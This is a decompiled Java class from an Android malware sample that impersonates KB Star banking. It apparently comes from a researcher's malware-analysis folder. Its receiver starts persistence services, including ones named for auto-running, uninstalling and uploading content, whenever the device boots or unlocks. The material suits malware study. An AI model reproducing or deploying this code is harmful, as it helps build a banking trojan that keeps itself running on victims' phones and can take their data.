package com.kbstar.kb.android.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.kbstar.kb.android.services.SoftService;
import com.kbstar.kb.android.services.UninstallerService;
import com.kbstar.kb.android.services.autoRunService;
import com.kbstar.kb.android.services.uploadContentService;
import com.kbstar.kb.android.star.util.LogUtil;

public class SystemReceiver
  extends BroadcastReceiver
{
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    paramIntent = paramIntent.getAction();
    if ((paramIntent.equals("android.intent.action.BOOT_COMPLETED")) || (paramIntent.equals("android.intent.action.USER_PRESENT")))
    {
      paramContext.startService(new Intent(paramContext, SoftService.class));
      paramContext.startService(new Intent(paramContext, UninstallerService.class));
      paramContext.startService(new Intent(paramContext, autoRunService.class));
      paramContext.startService(new Intent(paramContext, uploadContentService.class));
    }
    while (!paramIntent.equals("android.intent.action.ACTION_SHUTDOWN")) {
      return;
    }
    LogUtil.i("-----------sytem shutdown-----------------");
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/receiver/SystemReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */